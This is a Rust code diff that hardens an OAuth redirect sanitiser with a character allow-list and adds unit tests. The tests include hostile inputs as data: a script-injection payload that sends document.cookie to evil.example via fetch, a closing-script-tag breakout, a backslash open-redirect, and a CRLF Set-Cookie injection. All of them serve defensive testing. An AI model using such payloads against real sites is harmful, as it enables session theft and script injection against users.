@@ -110,7 +110,15 @@ pub fn guarded_http_client_no_reuse() -> reqwest::Client {
 /// Restrict an OAuth post-completion redirect to a relative path or a same-origin
 /// absolute URL; anything else (other origins, protocol-relative `//host`) falls
 /// back to `/`. Prevents the callbacks becoming an open-redirect phishing gadget.
+///
+/// A target holding any character outside [`is_plain_url_char`] also falls back
+/// to `/`: a quote, backslash or angle bracket has no business in a redirect we
+/// minted ourselves, and the OAuth callback writes the result into a script.
+/// Rejecting `\` also closes `/\host`, which browsers read as `//host`.
 pub fn safe_redirect(dest: &str, gateway_public_url: Option<&str>) -> String {
+    if !dest.chars().all(is_plain_url_char) {
+        return "/".to_string();
+    }
     if dest.starts_with('/') && !dest.starts_with("//") {
         return dest.to_string();
     }
@@ -122,6 +130,13 @@ pub fn safe_redirect(dest: &str, gateway_public_url: Option<&str>) -> String {
         return dest.to_string();
     }
     "/".to_string()
+}
+
+/// The characters a redirect target may hold: ASCII letters and digits, and the
+/// URL punctuation a path, query or fragment needs (`%` for anything else,
+/// percent-encoded).
+fn is_plain_url_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || "-._~/?#&=%:@+,;!$*[]".contains(c)
 }
 
 /// Validate that `raw` is an `http(s)` URL whose host does not resolve to a
@@ -266,6 +281,29 @@ mod tests {
         // With no configured base, only relative paths are allowed.
         assert_eq!(safe_redirect("https://app.nasiko.com/x", None), "/");
         assert_eq!(safe_redirect("/x", None), "/x");
+    }
+
+    #[test]
+    fn safe_redirect_rejects_characters_that_escape_a_script_or_url() {
+        let base = Some("https://app.nasiko.com");
+        // Ordinary paths with a query and fragment still pass.
+        assert_eq!(
+            safe_redirect("/mcp?tab=connectors&id=a1-b2#done", base),
+            "/mcp?tab=connectors&id=a1-b2#done"
+        );
+        // A quote would end the JS string the callback page writes it into.
+        assert_eq!(
+            safe_redirect("/\"+fetch('//evil.example/'+document.cookie)+\"", base),
+            "/"
+        );
+        assert_eq!(safe_redirect("https://app.nasiko.com/\"+x+\"", base), "/");
+        // A closing tag would end the script element.
+        assert_eq!(safe_redirect("/</script><script>alert(1)", base), "/");
+        // Browsers read `/\host` as `//host`.
+        assert_eq!(safe_redirect("/\\evil.example.com", base), "/");
+        // Whitespace and control characters.
+        assert_eq!(safe_redirect("/path\r\nSet-Cookie: x=y", base), "/");
+        assert_eq!(safe_redirect("/a b", base), "/");
     }
 
     #[test]
